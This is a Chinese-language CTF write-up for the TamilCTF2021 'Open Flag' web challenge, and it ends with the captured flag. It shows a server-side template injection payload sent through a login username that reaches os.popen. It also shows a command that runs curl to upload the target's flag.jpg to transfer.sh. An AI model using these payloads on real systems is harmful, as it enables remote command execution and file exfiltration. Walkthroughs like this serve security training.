# Open Flag

---

访问题目中给出的链接,发现是一个登录页面
<img src="../../CTF/TamilCTF2021/Web/images/login.png" alt="Open Flag" style="zoom:80%;" />
随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是`./flag.jpg`.
F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可
<img src="../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;" />

使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记`<!--`,找到`os._wrap_close`模块所在的索引为132,借助于`popen`函数可以直接执行系统命令

```python
{{"".__class__.__bases__[0].__subclasses__()}}
```

![image-20211119212248483](../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png)

使用`curl`命令将`flag.jpg`文件上传至[transfer.sh](http://transfer.sh/)

```python
{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()}}
```
在HTML注释中找到文件上传后的URL`http://transfer.sh/bDGBlw/flag.jpg`
![image-20211119204635015](../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png)

<img src="../../CTF/TamilCTF2021/Web/images/flag.jpg" alt="Open Flag" style="zoom:80%;" />

**flag:**`TamilCTF{SsTi_Is_VeRy_DaNgErOuS}`